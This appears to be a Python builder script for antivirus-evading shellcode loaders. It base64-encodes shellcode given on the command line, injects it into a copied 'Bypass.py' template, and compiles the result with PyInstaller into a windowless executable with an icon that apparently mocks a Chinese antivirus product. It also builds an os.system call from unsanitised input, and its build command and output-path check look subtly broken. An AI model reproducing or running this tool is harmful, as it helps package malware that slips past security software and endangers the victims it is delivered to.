# -*- coding: UTF-8 -*-
import sys,os,re,base64,json
import shutil

Shellcode = sys.argv[1]
Name = sys.argv[2]
ShellName =  Name+".py"
old_str = "Null"

def Start():
    if os.path.exists(Name) == True:
        print(True)
    else:
        os.mkdir(Name)
  

    pyfile = "./"+ Name +"/" + ShellName
    
    shutil.copy("./Bypass.py",pyfile)
    Fileif = os.path.exists(pyfile)

        
    if Fileif == True:
        new_str =  base64.b64encode(Shellcode.encode('utf-8')).decode("utf-8")
        writeFile(pyfile,old_str,new_str)
    else:
        print("文件不存在,检查原文件。")



def writeFile(file,old_str,new_str):

    with open(file, "r", encoding="utf-8") as f1,open("%s.bak" % file, "w", encoding="utf-8") as f2:
        for line in f1:
            f2.write(re.sub(old_str,new_str,line))
    os.remove(file)
    os.rename("%s.bak" % file, file)
    Exp()

def Exp():
    Dir = ".\\" + Name


# pyinstaller -F -w -i 360SB.ico P.py -o Name
# os.system("cd " + Dir + "&&" + "pyinstaller -F -w -i ./360SB.ico " + path)
    os.system("cd " + Dir + "&&" + "pyinstaller -F -w -i ../360SB.ico --distpath=../build" + ShellName)
    
    if os.path.exists(Name+".\\\dist\\"+ Name+".exe") == True:
        E_ok =json.dumps("success")
        print(E_ok)
    else:
        E_bad =json.dumps("failure")
        print(E_bad)

if __name__ == "__main__":
    Start()
